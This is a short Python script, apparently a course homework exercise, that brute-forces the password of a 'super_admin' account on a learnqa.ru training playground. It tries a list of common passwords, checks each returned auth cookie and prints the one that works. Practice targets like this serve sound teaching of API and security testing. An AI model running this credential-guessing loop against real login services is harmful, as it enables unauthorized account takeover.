import json
import requests

post_secret_password_homework_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
post_check_auth_cookie_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

login = "super_admin"
passwords = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111",
             "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely",
             "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"]

for password in passwords:
    post_secret_password_homework_response = requests.post(post_secret_password_homework_url,
                                                           data={"login": login, "password": password})
    auth_cookie = post_secret_password_homework_response.cookies.get("auth_cookie")

    check_auth_cookie_response = requests.post(post_check_auth_cookie_url,
                                               cookies={"auth_cookie": auth_cookie})

    check_auth_cookie_response_text = check_auth_cookie_response.text

    if check_auth_cookie_response_text == "You are NOT authorized":
        continue
    else:
        print(f"Correct password is - <{password}>")
        print(f"POST check_auth_cookie response text is - <{check_auth_cookie_response_text}>")
        break
